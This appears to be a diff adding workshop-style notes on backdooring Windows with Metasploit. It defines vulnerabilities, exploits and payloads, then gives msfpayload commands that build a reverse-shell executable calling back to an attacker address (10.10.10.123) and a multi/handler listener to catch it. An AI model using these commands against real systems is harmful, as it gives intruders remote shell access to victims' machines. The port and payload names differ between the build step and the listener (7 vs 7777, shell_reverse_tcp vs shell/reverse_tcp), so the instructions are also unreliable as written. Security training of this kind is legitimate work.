@@ -1,0 +1,77 @@
+# Exploits vs Payloads vs Vulnerabilities #
+
+- Vulnerabilities are places where you can take advantage of an operating system
+
+- Exploits are how you take advantage of vulnerabilities
+
+- Payloads are what you do once the exploit has been executed (reverse-shell or netcat listener etc)
+
+# Using Metasploit for backdooring OS #
+
+You will need a server setup to listen for incoming connections that has Metasploit installed. Kali has it by default.
+
+Start the metasploit console
+msfconsole
+
+Update metasploit console
+msfupdate
+
+Metasploit training
+www.offensive-security.com/metasploit-unleashed
+
+# Binary Payloads #
+
+Generate a binary payload instead of using netcat
+
+msfpayload windows/shell_reverse_tcp O
+-O command shows all options
+
+# Example Output #
+
+msfpayload windows/shell_reverse_tcp LHOST=metasploit_server_ip LPORT=listening_port_on_server
+
+msfpayload -h
+- List all available payloads
+
+/payload/path O
+- List available options for payload
+
+/payload/path X > payload.exe
+- Save payload and save it as a Windows Portable Executable
+
+/payload/path R > payload.raw
+- Raw format
+
+/payload/path C > payload.c
+- Export payload as C code
+
+/payload/path J > payload.java
+- Export code as java code
+
+# Create a payload #
+
+msfpayload windows/shell_reverse_tcp LHOST=10.10.10.123 LPORT=7 > /tmp/exploit.exe
+
+file /tmp/exploit.exe
+- PE32 executable (GUI) 
+- File lets you verify what type of file you have on your linux system
+
+Executes binary on target system and listens for response from binary
+
+# Set msfconsole to listen for your binary
+
+# Start msfconsole
+- msfconsole
+- use exploit/multi/handler
+- set payload windows/shell/reverse_tcp
+- set LHOST 10.10.10.123
+- set LPORT 7777
+- show options
+
+# Run exploit
+- exploit (starts listening port on metasploit systems) add it to your toolkit
+
+# Appendix
+
+https://github.com/DC801/Introtobackdoors
+
